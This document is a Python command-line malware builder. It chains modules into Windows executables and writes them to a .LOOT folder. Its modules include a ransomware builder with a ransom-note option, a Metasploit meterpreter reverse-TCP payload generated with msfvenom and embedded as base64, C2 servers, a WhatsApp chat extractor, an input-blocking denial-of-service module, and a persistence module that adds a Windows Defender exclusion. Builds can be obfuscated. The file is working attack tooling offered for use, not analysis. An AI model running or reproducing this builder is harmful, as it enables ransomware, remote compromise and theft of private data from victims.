import sys
sys.dont_write_bytecode = True
import os
import subprocess
import readline
from loading import clear_screen
import fileinput
import base64

MODULES = {
    'daemon/filedaemon': {'desc': 'Normal C2 server to receive data'},
    'daemon/spider': {'desc': 'Metasploit C2 server (reverse shell/payload delivery)'},
    'daemon/bartmoss': {'desc': 'Ransomware builder'},
    'daemon/chatwipe': {'desc': 'WhatsApp chat extractor'},
    'interfaceplug/blackout': {'desc': 'Screen blackout utility'},
    'interfaceplug/suicide': {'desc': 'Block input (DoS)'},
    'quickhack/ping': {'desc': 'Sends back user info to the C2 server'},
    'quickhack/icepick': {'desc': 'Adds EXE to persistence and adds exclusion to Windows Defender'},
}

MODULE_CHAIN = []

BUILD_OPTIONS = {
    'exe_name': 'payload.exe',
    'obfuscate': False,
}

MODULE_OPTIONS = {
    'daemon/spider': {
        'LHOST': '0.0.0.0',
        'LPORT': '4444',
        'KEY': 'changeme',
    },
    'daemon/filedaemon': {
        'PORT': '8080',
        'TARGET_IP': '127.0.0.1',
        'TARGET_PORT': '9000',
    },
    'daemon/bartmoss': {
        'NOTE': 'Your ransom note here',
    },
}

COMMANDS = ['use', 'build', 'clear', 'delete', 'show modules', 'show options', 'exit', 'set']

YELLOW = "\033[93m"
RED = "\033[91m"
GREEN = "\033[92m"
PINK = "\033[38;2;224;147;217m"
RESET = "\033[0m"

ASCII_ART = f'''
                                                -----
                                              /      \
                                          
       {RED}:================:{RESET}                     "    )/
      {RED}/||              ||{RESET}                      )_ /*
     {RED}/ ||    {PINK}System{RESET}    {RED}||{RESET}                           *
    {RED}|  ||     {PINK}Down{RESET}     {RED}||{RESET}                    (=====~*~======)
     {RED}\\ || {PINK}Please wait{RESET}  {RED}||{RESET}                   0      \\ /       0
       {RED}=================={RESET}                //   (====*====)   ||
{RED}........... /      \\.............{RESET}      //         *         ||
{RED}:\\        ############            \\{RESET}    ||    (=====*======)  ||
{RED}: --------------------------------- {RESET}    V          *          V
{RED}: |  *   |__________|| ::::::::::  |{RESET}     o   (======*=======) o
{RED}\\ |      |          ||   .......   |{RESET}     \\         *         ||
{RED}  --------------------------------- 8{RESET}    ||   (=====*======)  //
{RED}                                     8{RESET}    V         *         V
{RED}  --------------------------------- 8{RESET}    =|=;  (==/ * \\==)   =|=
{RED}  \\   ###########################  \\{RESET}    / ! \\     _ * __    / | \\
{RED}   \\  +++++++++++++++++++++++++++   \\{RESET}   ! !  !  (__/ \\__)  !  !  !
{RED}    \\ ++++++++++++++++++++++++++++   \\{RESET}         0 \\ \\V/ / 0
{RED}     \\________________________________\\{RESET}      ()   \\o o/   ()
{RED}      *********************************{RESET}      ()           ()
'''

def print_ascii_art():
    print(ASCII_ART)

def print_selected_modules():
    if MODULE_CHAIN:
        print("Selected modules:")
        for idx, mod in enumerate(MODULE_CHAIN, 1):
            print(f"  {idx} -> {PINK}{mod}{RESET}")
    else:
        print("No modules selected.")

def print_ui():
    clear_screen()
    print_ascii_art()
    print_selected_modules()
    print()

def get_module_names():
    return list(MODULES.keys())

def shell_completer(text, state):
    buffer = readline.get_line_buffer()
    line = buffer.split()
    if not line:
        opts = COMMANDS + get_module_names()
    elif line[0] == 'use':
        opts = [m for m in get_module_names() if m.startswith(text)]    
    else:
        opts = [c for c in COMMANDS if c.startswith(text)]
    if state < len(opts):
        return opts[state] + ' '
    return None

def print_modules():
    print("\nAvailable modules:")
    print(f"{'Module':<25} | Description")
    print("-"*60)
    for name, info in MODULES.items():
        print(f"{name:<25} | {info.get('desc', '')}")
    print()

def print_global_options():
    print(f"{'Option':<15} | Value")
    print("-"*30)
    for k, v in BUILD_OPTIONS.items():
        print(f"{k:<15} | {v}")
    print()

def print_module_options(module):
    opts = MODULE_OPTIONS.get(module)
    if not opts:
        print(f"No options for module: {module}")
        return
    print(f"{'Option':<15} | Value")
    print("-"*30)
    for k, v in opts.items():
        print(f"{k:<15} | {v}")
    print()

def print_options():
    print(f"{'Option':<15} | Value")
    print("-"*30)
    for k, v in BUILD_OPTIONS.items():
        print(f"{k:<15} | {v}")
    print()

def colorize_message(msg):
    lower = msg.lower()
    if any(word in lower for word in ["fail", "error", "unknown", "no modules to remove", "usage"]):
        return f"{RED}{msg}{RESET}"
    elif any(word in lower for word in ["final merged exe", "single module built", "set ", "removed module", "all selected modules cleared", "using module"]):
        return f"{GREEN}{msg}{RESET}"
    else:
        return f"{YELLOW}{msg}{RESET}"

def patch_bartmoss_note(note):
    go_path = os.path.join('DAEMONS', 'bartmoss.go')
    with open(go_path, 'r') as f:
        lines = f.readlines()
    with open(go_path, 'w') as f:
        for line in lines:
            if 'message := ' in line and 'YOUR NOTE HERE' in line:
                f.write(f'    message := "{note}\\n"\n')
            else:
                f.write(line)
    return lines

def restore_bartmoss_go(original_lines):
    go_path = os.path.join('DAEMONS', 'bartmoss.go')
    with open(go_path, 'w') as f:
        f.writelines(original_lines)

def generate_msfvenom_exe(lhost, lport, output_path):
    # Generate a Windows x64 meterpreter reverse_tcp payload
    import subprocess
    cmd = [
        'msfvenom',
        '-p', 'windows/x64/meterpreter/reverse_tcp',
        f'LHOST={lhost}',
        f'LPORT={lport}',
        '-f', 'exe',
        '-o', output_path
    ]
    result = subprocess.run(cmd, capture_output=True)
    if result.returncode != 0:
        raise RuntimeError(f"msfvenom failed: {result.stderr.decode()}")

def patch_spider_base64(exe_path):
    go_path = os.path.join('DAEMONS', 'spider.go')
    with open(exe_path, 'rb') as f:
        b64 = base64.b64encode(f.read()).decode()
    with open(go_path, 'r') as f:
        lines = f.readlines()
    with open(go_path, 'w') as f:
        for line in lines:
            if 'base64String :=' in line:
                f.write(f'    base64String := "{b64}"\n')
            else:
                f.write(line)
    return lines  # Return original lines for restoration

def restore_spider_go(original_lines):
    go_path = os.path.join('DAEMONS', 'spider.go')
    with open(go_path, 'w') as f:
        f.writelines(original_lines)

def patch_filedaemon_env(target_ip, target_port):
    # The new filedaemon.go uses environment variables, so we don't need to patch the file
    # Just return None to indicate no patching was done
    return None

def restore_filedaemon_go(original_lines):
    # No restoration needed for the new filedaemon.go
    pass

def shell():
    current_module = None
    readline.set_completer(shell_completer)
    readline.parse_and_bind('tab: complete')
    output_lines = []
    while True:
        try:
            print_ui()
            if output_lines:
                for line in output_lines:
                    print(colorize_message(line))
            prompt_num = len(MODULE_CHAIN) + 1
            prompt = f"{PINK}{prompt_num} * > {RESET}"
            print()
            cmdline = input(prompt)
            parts = cmdline.strip().split()
            output_lines = []
            if not parts:
                continue
            cmd = parts[0].lower()
            if cmd == 'use':
                if len(parts) < 2:
                    output_lines.append("Usage: use <module>")
                else:
                    modname = parts[1]
                    if modname not in MODULES:
                        output_lines.append(f"Unknown module: {modname}")
                    elif modname in MODULE_CHAIN:
                        output_lines.append(f"Module already selected: {modname}")
                    else:
                        current_module = modname
                        output_lines.append(f"Using module: {current_module}")
                        MODULE_CHAIN.append(current_module)
            elif cmd == 'build':
                if not MODULE_CHAIN:
                    output_lines.append("No modules in chain. Use 'use <module>' to add modules.")
                else:
                    loot_dir = os.path.abspath(os.path.join(os.getcwd(), '.LOOT'))
                    os.makedirs(loot_dir, exist_ok=True)
                    
                    if len(MODULE_CHAIN) == 1:
                        # Build single module
                        modname = MODULE_CHAIN[0]
                        output_lines.append(f"Building single module: {modname}")
                        
                        go_path = modname.replace('daemon/', 'DAEMONS/').replace('quickhack/', 'QUICKHACKS/').replace('interfaceplug/', 'INTERFACEPLUGS/') + '.go'
                        bartmoss_original = None
                        spider_original = None
                        filedaemon_original = None
                        
                        # Patch module-specific options
                        if modname == 'daemon/bartmoss':
                            note = MODULE_OPTIONS.get('daemon/bartmoss', {}).get('NOTE', 'YOUR NOTE HERE')
                            bartmoss_original = patch_bartmoss_note(note)
                        elif modname == 'daemon/spider':
                            opts = MODULE_OPTIONS.get('daemon/spider', {})
                            lhost = opts.get('LHOST', '0.0.0.0')
                            lport = opts.get('LPORT', '4444')
                            payload_path = os.path.join('.LOOT', 'spider_payload.exe')
                            try:
                                generate_msfvenom_exe(lhost, lport, payload_path)
                            except Exception as e:
                                output_lines.append(f"Failed to generate msfvenom payload: {e}")
                                continue
                            spider_original = patch_spider_base64(payload_path)
                        elif modname == 'daemon/filedaemon':
                            opts = MODULE_OPTIONS.get('daemon/filedaemon', {})
                            target_ip = opts.get('TARGET_IP', '127.0.0.1')
                            target_port = opts.get('TARGET_PORT', '9000')
                            filedaemon_original = patch_filedaemon_env(target_ip, target_port)
                        
                        # Generate single module name
                        module_name = modname.split('/')[-1]
                        final_name = f"{module_name}.exe"
                        final_path = os.path.abspath(os.path.join(loot_dir, final_name))
                        
                        output_lines.append(f"[*] Building single module: {final_name}")
                        obf_flag = []
                        if BUILD_OPTIONS.get('obfuscate'):
                            obf_flag = ['--obfuscate']
                        
                        from loading import loading_state
                        with loading_state(message="Building, please wait...", print_ascii_art=print_ascii_art):
                            result = subprocess.run([sys.executable, 'compiler.py', '--go_file', go_path, '--output_exe', final_name] + obf_flag)
                        
                        if result.returncode == 0:
                            output_lines.append(f"Single module built: {final_path}")
                        else:
                            output_lines.append("Failed to create single module EXE.")
                        
                        # Restore patched files
                        if bartmoss_original:
                            restore_bartmoss_go(bartmoss_original)
                        if spider_original:
                            restore_spider_go(spider_original)
                        if filedaemon_original:
                            restore_filedaemon_go(filedaemon_original)
                        
                        MODULE_CHAIN.clear()
                    else:
                        # Build merged modules (existing logic)
                        output_lines.append(f"Building merged malware with {len(MODULE_CHAIN)} modules...")
                        go_paths = []
                        bartmoss_original = None
                        spider_original = None
                        filedaemon_original = None
                        for modname in MODULE_CHAIN:
                            go_path = modname.replace('daemon/', 'DAEMONS/').replace('quickhack/', 'QUICKHACKS/').replace('interfaceplug/', 'INTERFACEPLUGS/') + '.go'
                            # Patch bartmoss note if needed
                            if modname == 'daemon/bartmoss':
                                note = MODULE_OPTIONS.get('daemon/bartmoss', {}).get('NOTE', 'YOUR NOTE HERE')
                                bartmoss_original = patch_bartmoss_note(note)
                            # Patch spider.go with msfvenom payload if needed
                            if modname == 'daemon/spider':
                                opts = MODULE_OPTIONS.get('daemon/spider', {})
                                lhost = opts.get('LHOST', '0.0.0.0')
                                lport = opts.get('LPORT', '4444')
                                payload_path = os.path.join('.LOOT', 'spider_payload.exe')
                                try:
                                    generate_msfvenom_exe(lhost, lport, payload_path)
                                except Exception as e:
                                    output_lines.append(f"Failed to generate msfvenom payload: {e}")
                                    continue
                                spider_original = patch_spider_base64(payload_path)
                            # Patch filedaemon.go with target IP and port if needed
                            if modname == 'daemon/filedaemon':
                                opts = MODULE_OPTIONS.get('daemon/filedaemon', {})
                                target_ip = opts.get('TARGET_IP', '127.0.0.1')
                                target_port = opts.get('TARGET_PORT', '9000')
                                filedaemon_original = patch_filedaemon_env(target_ip, target_port)
                            go_paths.append(go_path)
                        final_name = BUILD_OPTIONS['exe_name']
                        final_path = os.path.abspath(os.path.join(loot_dir, final_name))
                        output_lines.append(f"[*] Merging Go modules into final EXE: {final_name}")
                        obf_flag = []
                        if BUILD_OPTIONS.get('obfuscate'):
                            obf_flag = ['--obfuscate']
                        from loading import loading_state
                        with loading_state(message="Building, please wait...", print_ascii_art=print_ascii_art):
                            result = subprocess.run([sys.executable, 'compiler.py', '--merge'] + go_paths + [final_path] + obf_flag)
                        if result.returncode == 0:
                            output_lines.append(f"Final merged EXE: {final_path}")
                        else:
                            output_lines.append("Failed to create merged EXE.")
                        # Restore bartmoss.go if it was patched
                        if bartmoss_original:
                            restore_bartmoss_go(bartmoss_original)
                        # Restore spider.go if it was patched
                        if spider_original:
                            restore_spider_go(spider_original)
                        # Restore filedaemon.go if it was patched
                        if filedaemon_original:
                            restore_filedaemon_go(filedaemon_original)
                        MODULE_CHAIN.clear()
            elif cmd == 'clear':
                MODULE_CHAIN.clear()
                output_lines.append("All selected modules cleared.")
            elif cmd == 'delete':
                if MODULE_CHAIN:
                    removed = MODULE_CHAIN.pop()
                    output_lines.append(f"Removed module: {removed}")
                else:
                    output_lines.append("No modules to remove.")
            elif cmd == 'show':
                if len(parts) < 2:
                    output_lines.append("Usage: show <modules|options|global options>")
                else:
                    subcmd = parts[1].lower()
                    if subcmd == 'modules':
                        output_lines.append("")
                        output_lines.append(f"{'Module':<25} | Description")
                        output_lines.append("-"*60)
                        for name, info in MODULES.items():
                            output_lines.append(f"{name:<25} | {info.get('desc', '')}")
                    elif subcmd == 'global' and len(parts) > 2 and parts[2].lower() == 'options':
                        from io import StringIO
                        buf = StringIO()
                        buf.write(f"{'Option':<15} | Value\n")
                        buf.write("-"*30 + "\n")
                        for k, v in BUILD_OPTIONS.items():
                            buf.write(f"{k:<15} | {v}\n")
                        output_lines.append(buf.getvalue())
                    elif subcmd == 'options':
                        # Show options for the last selected module
                        if MODULE_CHAIN:
                            mod = MODULE_CHAIN[-1]
                            opts = MODULE_OPTIONS.get(mod)
                            if not opts:
                                output_lines.append(f"No options for module: {mod}")
                            else:
                                buf = []
                                buf.append(f"{'Option':<15} | Value")
                                buf.append("-"*30)
                                for k, v in opts.items():
                                    buf.append(f"{k:<15} | {v}")
                                output_lines.extend(buf)
                        else:
                            output_lines.append("No module selected. Use 'use <module>' to select one.")
                    else:
                        output_lines.append(f"Unknown show command: {subcmd}")
            elif cmd == 'set':
                if len(parts) < 3:
                    output_lines.append("Usage: set <option> <value>")
                else:
                    opt = parts[1]
                    val = parts[2]
                    # Try to set module option if a module is selected
                    if MODULE_CHAIN:
                        mod = MODULE_CHAIN[-1]
                        if mod in MODULE_OPTIONS and opt in MODULE_OPTIONS[mod]:
                            MODULE_OPTIONS[mod][opt] = val
                            output_lines.append(f"Set {opt} to {val} for {mod}")
                        elif opt in BUILD_OPTIONS:
                            if opt == 'obfuscate':
                                BUILD_OPTIONS[opt] = val.lower() in ('1', 'true', 'yes', 'on')
                            else:
                                BUILD_OPTIONS[opt] = val
                            output_lines.append(f"Set {opt} to {BUILD_OPTIONS[opt]}")
                        else:
                            output_lines.append(f"Unknown option: {opt}")
                    else:
                        # No module selected, set global option
                        if opt in BUILD_OPTIONS:
                            if opt == 'obfuscate':
                                BUILD_OPTIONS[opt] = val.lower() in ('1', 'true', 'yes', 'on')
                            else:
                                BUILD_OPTIONS[opt] = val
                            output_lines.append(f"Set {opt} to {BUILD_OPTIONS[opt]}")
                        else:
                            output_lines.append(f"Unknown option: {opt}")
            elif cmd in ('exit', 'quit'):
                print_ui()
                print("Exiting...")
                print()
                break
            else:
                output_lines.append(f"Unknown command: {cmd}")
        except (KeyboardInterrupt, EOFError):
            print()
            continue

if __name__ == "__main__":
    shell() 